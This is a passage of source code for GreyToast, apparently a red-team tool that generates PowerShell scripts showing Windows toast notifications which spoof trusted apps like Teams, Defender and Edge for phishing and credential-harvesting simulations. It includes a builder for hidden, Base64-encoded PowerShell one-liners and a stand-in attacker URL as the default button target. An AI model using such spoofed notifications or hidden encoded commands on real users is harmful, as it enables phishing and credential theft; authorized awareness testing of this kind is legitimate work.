+function resetXml(){xmlDirty=false;updXml();toast('↺ XML reset');}
+function applyXml(){
+  if(!cur)return;
+  const raw=document.getElementById('xmlEd').value.trim();
+  const ps=buildPSraw(cur,raw);
+  document.getElementById('psOut').innerHTML=highlightPSFull(ps);
+  applyPsFont();
+  xmlDirty=false; toast('✓ Applied');
+}
+function validateXml(){
+  const raw = document.getElementById('xmlEd').value.trim();
+  const msg = document.getElementById('xmlMsg');
+
+  // clear previous
+  msg.className = 'xml-msg'; msg.textContent = '';
+
+  // 1. Empty check
+  if (!raw) {
+    msg.className = 'xml-msg err';
+    msg.textContent = '✗ XML is empty';
+    return;
+  }
+
+  // 2. Parse XML
+  const parser = new DOMParser();
+  const doc = parser.parseFromString(raw, 'application/xml');
+
+  // 3. Check for parse errors — extract clean line/col from parsererror
+  const errNode = doc.querySelector('parsererror');
+  if (errNode) {
+    // parsererror contains verbose browser text — extract just the useful part
+    const raw_err = errNode.textContent || '';
+    // try to pull "line N, column N" or just the first useful sentence
+    const lineMatch = raw_err.match(/line[^\d]*(\d+)[^\d]*col(?:umn)?[^\d]*(\d+)/i);
+    const errMsg = lineMatch
+      ? `Parse error at line ${lineMatch[1]}, col ${lineMatch[2]}`
+      : raw_err.split('\n').find(l => l.trim() && !l.includes('<?xml')) || 'Invalid XML structure';
+    msg.className = 'xml-msg err';
+    msg.textContent = '✗ ' + errMsg.trim().slice(0, 120);
+    return;
+  }
+
+  // 4. Toast-specific schema checks
+  const warnings = [];
+  const root = doc.documentElement;
+
+  if (root.tagName !== 'toast') {
+    msg.className = 'xml-msg err';
+    msg.textContent = '✗ Root element must be <toast>, got <' + root.tagName + '>';
+    return;
+  }
+
+  const binding = doc.querySelector('binding');
+  if (!binding) warnings.push('Missing <binding> element inside <visual>');
+  else if (binding.getAttribute('template') !== 'ToastGeneric')
+    warnings.push('binding template should be "ToastGeneric", got "' + binding.getAttribute('template') + '"');
+
+  const texts = doc.querySelectorAll('binding > text');
+  if (texts.length === 0) warnings.push('No <text> elements found — toast will show blank');
+  else if (texts.length === 1) warnings.push('Only 1 <text> found — consider adding body text');
+
+  const actions = doc.querySelectorAll('action');
+  actions.forEach((a, i) => {
+    const type = a.getAttribute('activationType');
+    const args = a.getAttribute('arguments');
+    if (!a.getAttribute('content')) warnings.push('Action ' + (i+1) + ' has no content (button label)');
+    if (type === 'protocol' && !args) warnings.push('Action ' + (i+1) + ' is protocol type but has no arguments');
+  });
+
+  const validScenarios = ['default','urgent','reminder','alarm','incomingCall'];
+  const sc = root.getAttribute('scenario');
+  if (sc && !validScenarios.includes(sc))
+    warnings.push('Unknown scenario "' + sc + '" — valid: ' + validScenarios.join(', '));
+
+  // 5. Show result
+  if (warnings.length === 0) {
+    const actionCount = actions.length;
+    const textCount = texts.length;
+    msg.className = 'xml-msg ok';
+    msg.textContent = '✓ Valid — ' + textCount + ' text node' + (textCount!==1?'s':'') + ', ' + actionCount + ' action' + (actionCount!==1?'s':'');
+  } else {
+    msg.className = 'xml-msg warn';
+    msg.textContent = '⚠ Valid XML but ' + warnings.length + ' issue' + (warnings.length>1?'s':'') + ': ' + warnings.join(' · ');
+  }
+}
+function fmtXml(){
+  const ta=document.getElementById('xmlEd');
+  const doc=new DOMParser().parseFromString(ta.value,'application/xml');
+  if(doc.querySelector('parsererror')){toast('✗ Cannot format — fix XML errors first',true);return;}
+  ta.value=fmtNode(doc.documentElement,0);
+  toast('✓ XML formatted');
+}
+function fmtNode(n,d){
+  const i='  '.repeat(d);
+  if(n.nodeType===3){const t=n.textContent.trim();return t?i+t:'';}
+  if(n.nodeType!==1)return'';
+  let a='';for(const x of n.attributes)a+=` ${x.name}="${x.value}"`;
+  const ch=Array.from(n.childNodes).map(c=>fmtNode(c,d+1)).filter(Boolean);
+  return ch.length?`${i}<${n.tagName}${a}>\n${ch.join('\n')}\n${i}</${n.tagName}>`:`${i}<${n.tagName}${a}/>`;
+}
+function copyXml(){navigator.clipboard.writeText(document.getElementById('xmlEd').value);toast('✓ XML copied');}
+
+// ─── PS BUILD ────────────────────────────────────────────
+function buildPS(s){
+  return`# Scenario ${s.num} — ${s.name}\n# Technique: ${s.tech} | App: ${s.app}\nAdd-Type -AssemblyName System.Runtime.WindowsRuntime\n[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]\n[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]\n\n$AUMID = "${s.aumid}"\n$xml = @"\n${buildXml(s)}\n"@\n\n$doc = New-Object Windows.Data.Xml.Dom.XmlDocument\n$doc.LoadXml($xml)\n$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)\n$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)\n$notifier.Show($toast)`;
+}
+function buildPSraw(s,xml){
+  return`# Scenario ${s.num} — ${s.name} [CUSTOM XML]\nAdd-Type -AssemblyName System.Runtime.WindowsRuntime\n[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]\n[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]\n\n$AUMID = "${s.aumid}"\n$xml = @"\n${xml}\n"@\n\n$doc = New-Object Windows.Data.Xml.Dom.XmlDocument\n$doc.LoadXml($xml)\n$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)\n$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)\n$notifier.Show($toast)`;
+}
+function escHtml(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function highlightPS(raw){
+  const lines = raw.split('\n');
+  return lines.map(line => {
+    // Work on escaped version
+    let s = escHtml(line);
+
+    // 1. Full-line comments (# ...)
+    if(/^\s*#/.test(line)){
+      return `<span class="ps-c">${s}</span>`;
+    }
+
+    // 2. Here-string content (XML lines — between @" and "@)
+    // handled below via state, skip for now — tag inline
+
+    // 3. Type accelerators [Windows.UI...]
+    s = s.replace(/(\[[A-Za-z][A-Za-z0-9.,\s]+\])/g, '<span class="ps-type">$1</span>');
+
+    // 4. $variables
+    s = s.replace(/(\$[A-Za-z_][A-Za-z0-9_]*)/g, '<span class="ps-var">$1</span>');
+
+    // 5. Strings in double quotes (after escaping, look for &quot;...&quot;)
+    s = s.replace(/(&quot;[^&]*&quot;)/g, '<span class="ps-str">$1</span>');
+
+    // 6. Keywords
+    const kws = ['Add-Type','New-Object','function','param','return','if','else','foreach','while','try','catch'];
+    kws.forEach(k => {
+      s = s.replace(new RegExp(`\b(${k})\b`,'g'), '<span class="ps-kw">$1</span>');
+    });
+
+    // 7. Cmdlets (Verb-Noun patterns not already wrapped)
+    s = s.replace(/([A-Z][a-z]+-[A-Z][a-z]+[A-Za-z]*)(?![^<]*>)/g, '<span class="ps-cmd">$1</span>');
+
+    // 8. Inline comment at end of line
+    s = s.replace(/(#[^<]*)$/, '<span class="ps-c">$1</span>');
+
+    return s;
+  }).join('\n');
+}
+
+function highlightXmlBlock(xmlStr){
+  let s = escHtml(xmlStr);
+  // attribute values "..."
+  s = s.replace(/(&quot;[^&quot;]*&quot;)/g,'<span class="ps-xml-str">$1</span>');
+  // attributes name=
+  s = s.replace(/\b([a-zA-Z][a-zA-Z0-9-]*)=/g,'<span class="ps-xml-attr">$1</span>=');
+  // tags
+  s = s.replace(/(&lt;\/?[a-zA-Z][a-zA-Z0-9]*)/g,'<span class="ps-xml-tag">$1</span>');
+  s = s.replace(/(\/&gt;|&gt;)/g,'<span class="ps-xml-tag">$1</span>');
+  return s;
+}
+
+function highlightPSFull(raw){
+  const lines = raw.split('\n');
+  let inHereStr = false;
+  let hereLines = [];
+
+  const output = [];
+  for(let i=0;i<lines.length;i++){
+    const line = lines[i];
+    const trimmed = line.trim();
+
+    if(!inHereStr && (trimmed === '@"' || line.endsWith('@"'))){
+      inHereStr = true;
+      output.push(escHtml(line));
+      continue;
+    }
+    if(inHereStr){
+      if(trimmed === '"@'){
+        inHereStr = false;
+        output.push(escHtml(line));
+      } else {
+        // XML inside here-string
+        output.push(highlightXmlBlock(line));
+      }
+      continue;
+    }
+    // Normal PS line
+    let s = escHtml(line);
+    if(/^\s*#/.test(line)){
+      output.push(`<span class="ps-c">${s}</span>`);
+      continue;
+    }
+    // type accelerators
+    s = s.replace(/(\[[A-Za-z][A-Za-z0-9.,\s:]+\])/g,'<span class="ps-type">$1</span>');
+    // $variables
+    s = s.replace(/(\$[A-Za-z_][A-Za-z0-9_]*)/g,'<span class="ps-var">$1</span>');
+    // quoted strings
+    s = s.replace(/(&quot;(?:[^&]|&(?!quot;))*&quot;)/g,'<span class="ps-str">$1</span>');
+    // keywords
+    ['Add-Type','New-Object','function','param','return','if','else','foreach','while','try','catch'].forEach(k=>{
+      s = s.replace(new RegExp(`(?<![\w-])(${k})(?![\w-])`,'g'),'<span class="ps-kw">$1</span>');
+    });
+    // cmdlets
+    s = s.replace(/(?<![\w<])([A-Z][a-z]+-[A-Z][a-zA-Z]+)(?![^<]*&gt;)/g,'<span class="ps-cmd">$1</span>');
+    // operators ::  =
+    s = s.replace(/(::)/g,'<span class="ps-op">$1</span>');
+    // trailing comment
+    s = s.replace(/(#[^<&\n]*)$/, '<span class="ps-c">$1</span>');
+    output.push(s);
+  }
+  return output.join('\n');
+}
+
+function gen(){
+  if(!cur)return;
+  const el = document.getElementById('psOut');
+  if (onelinerMode) {
+    el.innerHTML = highlightOneliner(buildOneliner(cur));
+  } else {
+    el.innerHTML = highlightPSFull(buildPS(cur));
+  }
+  applyPsFont();
+}
+function genAll(){
+  const hdr=`# ═══════════════════════════════════════════════════════════════\n# GreyToast — All ${all().length} Scenarios\n# Source: github.com/zer0lightning/greytoast\n# Generated: ${new Date().toISOString()}\n# ═══════════════════════════════════════════════════════════════\n\nAdd-Type -AssemblyName System.Runtime.WindowsRuntime\n[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]\n[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]\n\nfunction Send-Toast([string]$AUMID,[string]$Xml){\n  $doc=[Windows.Data.Xml.Dom.XmlDocument]::new()\n  $doc.LoadXml($Xml)\n  [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID).Show([Windows.UI.Notifications.ToastNotification]::new($doc))\n}\n\n`;
+  return hdr+all().map(s=>`# ── ${s.num}: ${s.name}\nSend-Toast "${s.aumid}" @"\n${buildXml(s)}\n"@`).join('\n\n');
+}
+
+// ─── ONE-LINER ENCODED COMMAND ───────────────────────────
+let onelinerMode = false;
+
+function toEncodedCommand(psScript) {
+  // PowerShell -EncodedCommand requires Base64 of UTF-16LE bytes
+  let utf16 = '';
+  for (let i = 0; i < psScript.length; i++) {
+    const code = psScript.charCodeAt(i);
+    utf16 += String.fromCharCode(code & 0xFF, (code >> 8) & 0xFF);
+  }
+  return btoa(utf16);
+}
+
+function buildOneliner(s) {
+  // Build a proper PS one-liner WITHOUT here-strings.
+  // Here-strings require newlines and cannot be collapsed — we escape the XML
+  // into a regular double-quoted PS string instead.
+  // In PS double-quoted strings: backtick=escape, " -> `", $ -> `$
+  function psEscapeStr(str) {
+    return str
+      .replace(/`/g, '``')        // backtick first
+      .replace(/"/g, '`"')        // double-quote
+      .replace(/\$/g, '`$')      // dollar sign — prevent variable expansion
+      .replace(/\s+/g, ' ')      // collapse whitespace (XML doesn't care)
+      .trim();
+  }
+
+  const xml    = psEscapeStr(buildXml(s));
+  const aumid  = psEscapeStr(s.aumid);
+
+  // Compact one-liner: semicolon-separated statements, no here-string
+  const script = [
+    'Add-Type -AssemblyName System.Runtime.WindowsRuntime',
+    '[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime] | Out-Null',
+    '[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime] | Out-Null',
+    `$aumid = "${aumid}"`,
+    `$xml   = "${xml}"`,
+    '$doc = [Windows.Data.Xml.Dom.XmlDocument]::new()',
+    '$doc.LoadXml($xml)',
+    '$toast    = [Windows.UI.Notifications.ToastNotification]::new($doc)',
+    '$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($aumid)',
+    '$notifier.Show($toast)',
+  ].join('; ');
+
+  // Base64-encode the clean script for -EncodedCommand
+  const b64 = toEncodedCommand(script);
+  return `powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand ${b64}`;
+}
+
+function toggleOneliner() {
+  onelinerMode = !onelinerMode;
+  const btn = document.getElementById('onelineBtn');
+  const copyLbl = document.getElementById('copyBtnLabel');
+  const saveLbl = document.getElementById('saveBtnLabel');
+
+  if (onelinerMode) {
+    btn.style.background = 'rgba(167,139,250,.15)';
+    btn.style.borderColor = 'var(--purple)';
+    btn.style.color = 'var(--purple)';
+    copyLbl.textContent = 'Copy 1-liner';
+    saveLbl.textContent = 'Save 1-liner';
+  } else {
+    btn.style.background = '';
+    btn.style.borderColor = '';
+    btn.style.color = '';
+    copyLbl.textContent = 'Copy .ps1';
+    saveLbl.textContent = 'Save .ps1';
+  }
+  // Re-render output in current mode
+  if (cur) {
+    const el = document.getElementById('psOut');
+    if (onelinerMode) {
+      const oneliner = buildOneliner(cur);
+      el.innerHTML = highlightOneliner(oneliner);
+    } else {
+      el.innerHTML = highlightPSFull(buildPS(cur));
+    }
+    applyPsFont();
+  }
+}
+
+function highlightOneliner(line) {
+  let s = escHtml(line);
+  // executable
+  s = s.replace(/^(powershell\.exe)/,'<span class="ps-cmd">$1</span>');
+  // flags
+  s = s.replace(/\s(-\w+)/g,' <span class="ps-kw">$1</span>');
+  // the base64 blob — colour it muted
+  s = s.replace(/([A-Za-z0-9+/=]{20,})/,'<span class="ps-c">$1</span>');
+  return s;
+}
+
+function handleSave() {
+  if (onelinerMode) {
+    // Export oneliner as .ps1 file
+    if (!cur) return;
+    const oneliner = buildOneliner(cur);
+    const slug_name = (cur.name||'greytoast').toLowerCase().replace(/[^a-z0-9]+/g,'-').slice(0,40);
+    const uid = Math.random().toString(36).slice(2,8).toUpperCase();
+    const fname = `${slug_name}-oneliner-${uid}.ps1`;
+    const blob = new Blob([oneliner], {type:'text/plain;charset=utf-8'});
+    const a = Object.assign(document.createElement('a'),{href:URL.createObjectURL(blob),download:fname});
+    document.body.appendChild(a);a.click();document.body.removeChild(a);
+    setTimeout(()=>URL.revokeObjectURL(a.href),2000);
+    toast(`⬇ ${fname}`);
+  } else {
+    promptExport('single');
+  }
+}
+
+// ─── COPY ────────────────────────────────────────────────
+function copyOut(){
+  const btn=document.getElementById('copyBtn');
+  let textToCopy;
+  if (onelinerMode && cur) {
+    textToCopy = buildOneliner(cur);
+  } else {
+    textToCopy = document.getElementById('psOut').innerText || document.getElementById('psOut').textContent;
+  }
+  navigator.clipboard.writeText(textToCopy).then(()=>{
+    const orig = btn.innerHTML;
+    btn.innerHTML='<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 7l3 3 5-6" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg> Copied!';
+    btn.style.background='var(--green)';btn.style.borderColor='var(--green)';btn.style.color='#000';
+    setTimeout(()=>{
+      btn.innerHTML=orig;
+      btn.style.background='';btn.style.borderColor='';btn.style.color='';
+    },2000);
+  });
+}
+
+// ─── PS FONT SIZE ─────────────────────────────────────────
+let psFontSize = parseFloat(localStorage.getItem('gt_ps_font')||'0.65');
+function applyPsFont(){
+  const el = document.getElementById('psOut');
+  if(el) el.style.setProperty('--ps-font', psFontSize+'rem');
+}
+function psFont(dir){
+  if(dir===0) psFontSize=0.65;
+  else psFontSize=Math.min(1.1,Math.max(0.5,Math.round((psFontSize+dir*0.05)*100)/100));
+  applyPsFont();
+  localStorage.setItem('gt_ps_font',psFontSize);
+  // visual feedback: briefly highlight the output
+  const el=document.getElementById('psOut');
+  el.style.transition='background .15s';
+  el.style.background='rgba(122,143,175,.06)';
+  setTimeout(()=>el.style.background='',300);
+}
+
+// ─── TABS ────────────────────────────────────────────────
+function showTab(id,el){
+  document.querySelectorAll('.ed-tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('tab-form').className='ed-body'+(id==='form'?'':' hidden');
+  document.getElementById('tab-xml').className='ed-body'+(id==='xml'?'':' hidden')+(id==='xml'?' ':'');
+  if(id==='xml'){document.getElementById('tab-xml').style.flex='1';xmlDirty=false;updXml();}
+}
+
+// ─── CUSTOM SCENARIOS ────────────────────────────────────
+function newScenario(){
+  const uid='C'+Date.now().toString(36).toUpperCase();
+  const n={id:uid,num:'C'+(custom.length+1),app:'Custom',_custom:true,name:'New Scenario',
+    aumid:'MSEdge',scenario:'default',tech:'Custom',payload:'URL / Protocol',title:'Custom Title',body:'Custom body text.',
+    attribution:'',logo:'',hasInput:false,inputType:'text',inputPlaceholder:'',selections:'',
+    a1text:'Click Here',a1type:'url',a1arg:'https://attacker.example.com/',
+    a2:true,a2text:'Dismiss',a2type:'dismiss',a2arg:'dismiss'};
+  custom.push(n);saveCustom();renderSidebar();load(n);
+  setTimeout(()=>document.getElementById('f-label').select(),100);
+  toast('✓ New scenario created');
+}
+function dupScenario(){
+  if(!cur)return;
+  const uid='D'+Date.now().toString(36).toUpperCase();
+  const d=JSON.parse(JSON.stringify(cur));
+  d.id=uid;d.num='C'+(custom.length+1);d.name='Copy of '+cur.name;d._custom=true;
+  custom.push(d);saveCustom();renderSidebar();load(d);toast('✓ Duplicated');
+}
+function saveCustom(){localStorage.setItem('gt_custom',JSON.stringify(custom));}
+
+function resetPage(){
+  if(!confirm('Reset GreyToast? This will clear all custom scenarios and saved settings.')) return;
+  ['gt_custom','gt_w_left','gt_w_right','gt_ps_font','gt_history','gt_favs'].forEach(k=>localStorage.removeItem(k));
+  location.reload();
+}
+
+// ─── EXPORT ──────────────────────────────────────────────
+function slug(s){return(s||'greytoast').toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-+|-+$/g,'').slice(0,40)||'greytoast';}
+function uid8(){return Math.random().toString(36).slice(2,10).toUpperCase();}
+
+function promptExport(mode){
+  exportMode=mode; savedUid=uid8();
+  document.getElementById('m-title').textContent=mode==='single'?'Save This Scenario':'Save All Scenarios';
+  document.getElementById('m-sub').textContent=mode==='single'&&cur?`#${cur.num} — ${cur.name}`:`All ${all().length} scenarios`;
+  document.getElementById('m-fname').value=mode==='single'&&cur?slug(cur.name):'greytoast-all';
+  updateFnPreview();
+  document.getElementById('exportOverlay').classList.add('show');
+  setTimeout(()=>document.getElementById('m-fname').focus(),100);
+}
+function updateFnPreview(){
+  const base=slug(document.getElementById('m-fname').value);
+  document.getElementById('m-preview').textContent=base+(uidOn?'-'+savedUid:'')+'.ps1';
+}
+function toggleUid(){
+  uidOn=!uidOn;
+  document.getElementById('uidSw').className='sw'+(uidOn?' on':'');
+  updateFnPreview();
+}
+function doExport(){
+  const fname=document.getElementById('m-preview').textContent;
+  const content=exportMode==='single'?(cur?buildPS(cur):'# No scenario selected'):genAll();
+  const blob=new Blob([content],{type:'text/plain;charset=utf-8'});
+  const a=Object.assign(document.createElement('a'),{href:URL.createObjectURL(blob),download:fname});
+  document.body.appendChild(a);a.click();document.body.removeChild(a);
+  setTimeout(()=>URL.revokeObjectURL(a.href),2e3);
+  document.getElementById('exportOverlay').classList.remove('show');
+  toast(`⬇ ${fname}`);
+}
+function showAdvanced(){ document.getElementById('advOverlay').classList.add('show'); }
+function showAbout(){ document.getElementById('aboutOverlay').classList.add('show'); }
+function closeOverlay(e,id){if(e.target===document.getElementById(id))document.getElementById(id).classList.remove('show');}
+
+// ─── TOAST FEEDBACK ──────────────────────────────────────
+function toast(msg,err=false){
+  const el=document.getElementById('fb');
+  el.textContent=msg; el.className='feedback'+(err?' err':'')+' show';
+  clearTimeout(el._t); el._t=setTimeout(()=>el.classList.remove('show'),3e3);
+}
+
+// ─── KEYBOARD ────────────────────────────────────────────
+document.addEventListener('keydown',e=>{
+  const inInput=['INPUT','TEXTAREA','SELECT'].includes(document.activeElement.tagName);
+  if(e.key==='Escape'){document.getElementById('exportOverlay').classList.remove('show');}
+  if(inInput)return;
+  if(e.key==='g'||e.key==='G')gen();
+  if(e.key==='n'||e.key==='N')newScenario();
+  if(e.key==='d'||e.key==='D')dupScenario();
+  if(e.key==='e'||e.key==='E'&&cur)promptExport('single');
+  if(e.key==='c'||e.key==='C')copyOut();
+  if(e.key==='/')e.preventDefault(),document.getElementById('sbSearch').focus();
+});
+
+// ─── INIT ────────────────────────────────────────────────
+renderPayloadFilters();
+renderSidebar();
+load(SCENARIOS[0]);
+applyPsFont(); // apply saved font size after first render
+// live clock
+setInterval(()=>{const el=document.getElementById('tw-time');if(el)el.textContent=new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});},30000);
+
+// ─── RESIZABLE PANELS ────────────────────────────────────
+(function(){
+  const LEFT_DEFAULT  = 220;
+  const RIGHT_DEFAULT = 320;
+  const MIN_LEFT   = 140;
+  const MAX_LEFT   = 400;
+  const MIN_RIGHT  = 200;
+  const MAX_RIGHT  = 500;
+  const MIN_CENTER = 300;
+
+  const panelLeft   = document.getElementById('panelLeft');
+  const panelCenter = document.getElementById('panelCenter');
+  const panelRight  = document.getElementById('panelRight');
+  const rLeft       = document.getElementById('resizerLeft');
+  const rRight      = document.getElementById('resizerRight');
+
+  // Restore saved sizes
+  const savedLeft  = parseInt(localStorage.getItem('gt_w_left'))  || LEFT_DEFAULT;
+  const savedRight = parseInt(localStorage.getItem('gt_w_right')) || RIGHT_DEFAULT;
+  panelLeft.style.width  = savedLeft  + 'px';
+  panelRight.style.width = savedRight + 'px';
+
+  function clamp(val, min, max){ return Math.min(max, Math.max(min, val)); }
+
+  function makeDraggable(resizer, getPanel, getSide, min, max, storageKey){
+    let startX, startW;
+
+    resizer.addEventListener('mousedown', e => {
+      e.preventDefault();
+      startX = e.clientX;
+      startW = getPanel().offsetWidth;
+      resizer.classList.add('dragging');
+      document.body.style.cursor = 'col-resize';
+      document.body.style.userSelect = 'none';
+
+      function onMove(e){
+        const layout = document.querySelector('.layout');
+        const centerW = panelCenter.offsetWidth;
+        const delta = getSide() === 'left'
+          ? e.clientX - startX
+          : startX - e.clientX;
+        const newW = clamp(startW + delta, min, max);
+        // ensure center panel doesn't get squeezed below min
+        const usedW = (getSide() === 'left' ? newW : panelLeft.offsetWidth)
+                    + (getSide() === 'right' ? newW : panelRight.offsetWidth)
+                    + 8; // 2 resizers × 4px
+        if(layout.offsetWidth - usedW < MIN_CENTER) return;
+        getPanel().style.width = newW + 'px';
+        localStorage.setItem(storageKey, newW);
+      }
+
+      function onUp(){
+        resizer.classList.remove('dragging');
+        document.body.style.cursor = '';
+        document.body.style.userSelect = '';
+        document.removeEventListener('mousemove', onMove);
+        document.removeEventListener('mouseup', onUp);
+      }
+
+      document.addEventListener('mousemove', onMove);
+      document.addEventListener('mouseup', onUp);
+    });
+
+    // double-click resets to default
+    resizer.addEventListener('dblclick', () => {
+      getPanel().style.width = (getSide()==='left' ? LEFT_DEFAULT : RIGHT_DEFAULT) + 'px';
+      localStorage.removeItem(storageKey);
+      toast('↺ Panel reset to default');
+    });
+  }
+
+  makeDraggable(
+    rLeft,
+    () => panelLeft,
+    () => 'left',
+    MIN_LEFT, MAX_LEFT, 'gt_w_left'
+  );
+
+  makeDraggable(
+    rRight,
+    () => panelRight,
+    () => 'right',
+    MIN_RIGHT, MAX_RIGHT, 'gt_w_right'
+  );
+})();
+</script>
+<!-- FOOTER -->
+<div style="flex-shrink:0;background:var(--panel);border-top:1px solid var(--border);padding:6px 16px;display:flex;align-items:center;justify-content:space-between;gap:16px;z-index:10;position:relative">
+  <div style="display:flex;align-items:center;gap:16px">
+    <span style="font-size:.62rem;color:var(--muted)">© 2026 GreyToast <span style="color:var(--border3);margin:0 4px">·</span><span style="font-family:'JetBrains Mono',monospace;color:var(--text3)">v3.0</span> <span style="color:var(--border3);margin:0 4px">·</span><a href="https://github.com/zer0lightning/greytoast" target="_blank" style="color:var(--sub);text-decoration:none;transition:color .15s" onmouseover="this.style.color='var(--accent)'" onmouseout="this.style.color='var(--sub)'">github.com/zer0lightning/greytoast</a></span>
+  </div>
+  <div style="display:flex;align-items:center;gap:10px">
+    <span style="font-size:.6rem;color:var(--text3);font-family:'JetBrains Mono',monospace;letter-spacing:.2px">For authorized use only</span>
+    <button onclick="showAbout()" style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--sub);background:transparent;border:none;cursor:pointer;text-decoration:underline;text-underline-offset:2px" onmouseover="this.style.color='var(--text)'" onmouseout="this.style.color='var(--sub)'">Disclaimer</button>
+  </div>
+</div>
+
+<!-- ABOUT / DISCLAIMER MODAL -->
+<div class="overlay" id="aboutOverlay" onclick="closeOverlay(event,'aboutOverlay')">
+  <div class="modal" style="width:520px;max-width:94vw;max-height:88vh;overflow-y:auto">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+      <svg width="36" height="36" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <!-- card shadow -->
+        <rect x="4" y="7" width="24" height="18" rx="4" fill="#0d1018" opacity=".6"/>
+        <!-- notification card body -->
+        <rect x="3" y="5" width="24" height="18" rx="4" fill="#1c2132" stroke="#3a4258" stroke-width=".8"/>
+        <!-- left accent stripe — warm slate -->
+        <rect x="3" y="5" width="3.5" height="18" rx="3" fill="#5a6480"/>
+        <!-- app icon dot -->
+        <rect x="10" y="9" width="4" height="4" rx="1.5" fill="#3a4258"/>
+        <rect x="10" y="9" width="4" height="4" rx="1.5" fill="#8090b0" opacity=".4"/>
+        <!-- title line -->
+        <rect x="16" y="9.5" width="8" height="1.8" rx=".9" fill="#6b7a9f"/>
+        <!-- subtitle line -->
+        <rect x="16" y="12.5" width="5" height="1.4" rx=".7" fill="#3a4258"/>
+        <!-- body line 1 -->
+        <rect x="8" y="16" width="14" height="1.4" rx=".7" fill="#2e3650"/>
+        <!-- body line 2 shorter -->
+        <rect x="8" y="18.5" width="9" height="1.4" rx=".7" fill="#2e3650"/>
+        <!-- top gloss -->
+        <rect x="3" y="5" width="24" height="2" rx="2" fill="white" opacity=".04"/>
+      </svg>
+      <div>
+        <div style="font-size:.92rem;font-weight:800;letter-spacing:-.2px">Grey<span style="color:var(--accent)">Toast</span></div>
+        <div style="font-family:'JetBrains Mono',monospace;font-size:.57rem;color:var(--sub);margin-top:1px">v3.0 · Windows Toast Notification Generator</div>
+      </div>
+    </div>
+
+    <div style="font-size:.7rem;color:var(--sub);line-height:1.6;margin-bottom:12px">
+      GreyToast is a browser-based toolkit for generating Windows 10/11 Toast Notification PowerShell scripts. It is designed to support <strong style="color:var(--text)">red team operations</strong>, <strong style="color:var(--text)">security awareness training</strong>, and <strong style="color:var(--text)">social engineering assessments</strong> in authorized environments.
+    </div>
+
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="background:var(--bg);border:1px solid var(--border2);border-radius:7px;padding:10px 12px;display:flex;gap:10px;align-items:flex-start">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;margin-top:1px"><circle cx="8" cy="8" r="7" stroke="#3dd68c" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#3dd68c" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <div><div style="font-size:.68rem;font-weight:600;color:var(--text);margin-bottom:2px">Intended Use</div><div style="font-size:.65rem;color:var(--sub);line-height:1.5">Authorized penetration testing, red team engagements, phishing simulations, and internal security awareness programs where explicit written permission has been obtained.</div></div>
+      </div>
+      <div style="background:var(--bg);border:1px solid rgba(247,95,107,.2);border-radius:7px;padding:10px 12px;display:flex;gap:10px;align-items:flex-start">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;margin-top:1px"><path d="M8 2L1.5 13.5h13L8 2z" stroke="#f75f6b" stroke-width="1.2" stroke-linejoin="round"/><path d="M8 6v4M8 11.5v.5" stroke="#f75f6b" stroke-width="1.2" stroke-linecap="round"/></svg>
+        <div><div style="font-size:.68rem;font-weight:600;color:var(--red);margin-bottom:2px">Legal Disclaimer</div><div style="font-size:.65rem;color:var(--sub);line-height:1.5">This tool is provided for <strong style="color:var(--text)">educational and authorized security testing purposes only</strong>. Unauthorized use against systems or individuals without explicit consent may violate computer fraud laws including the CFAA, Computer Misuse Act, and equivalent legislation in your jurisdiction. The author assumes no liability for misuse.</div></div>
+      </div>
+      <div style="background:var(--bg);border:1px solid var(--border2);border-radius:7px;padding:10px 12px;display:flex;gap:10px;align-items:flex-start">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;margin-top:1px"><rect x="2" y="2" width="12" height="12" rx="2" stroke="#7a8faf" stroke-width="1.2"/><path d="M5 8h6M8 5v6" stroke="#7a8faf" stroke-width="1.2" stroke-linecap="round"/></svg>
+        <div><div style="font-size:.68rem;font-weight:600;color:var(--text);margin-bottom:2px">What It Does</div><div style="font-size:.65rem;color:var(--sub);line-height:1.5">Generates PowerShell scripts that trigger Windows Toast Notifications spoofing trusted system apps (Teams, Defender, Edge, etc.) to simulate phishing, vishing, credential harvesting, and malware delivery scenarios during authorized red team operations.</div></div>
+      </div>
+    </div>
+
+
+    <div style="border-top:1px solid var(--border);margin-top:4px;padding-top:14px">
